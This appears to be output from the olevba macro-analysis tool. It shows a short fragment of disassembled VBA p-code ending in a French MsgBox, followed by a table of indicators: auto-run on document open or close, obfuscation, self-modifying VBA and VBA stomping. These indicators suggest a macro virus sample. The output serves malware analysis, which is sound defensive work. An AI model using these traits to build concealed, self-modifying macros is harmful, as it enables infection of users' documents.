' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0028 "Vive les mercredi et les jours fériés..."
' 	ArgsLd MsgBox 0x0003 
' 	St temporary 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	EndSub 
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

